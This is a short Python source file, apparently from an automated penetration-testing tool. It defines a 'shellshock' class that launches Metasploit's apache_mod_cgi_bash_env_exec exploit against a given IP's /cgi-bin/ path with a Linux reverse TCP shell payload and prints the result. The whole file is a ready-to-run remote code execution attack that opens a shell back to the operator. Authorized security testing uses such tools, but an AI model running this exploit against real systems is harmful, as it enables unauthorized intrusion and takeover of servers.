from .util import run_command

class shellshock:
    def __init__(self, ip):
        self.ip = ip
        self.target_uri = "/cgi-bin/"
    
    def run(self):
        cmd = f"msfconsole -x 'use exploit/multi/http/apache_mod_cgi_bash_env_exec; set RHOSTS {self.ip}; set TARGET_URI {self.target_uri}; set PAYLOAD linux/x86/shell/reverse_tcp; run'"
        result = run_command(cmd)
        print(result)
        # Scrape output for knownn vulnerabilities
        output = result["output"]
        print(output)
        return output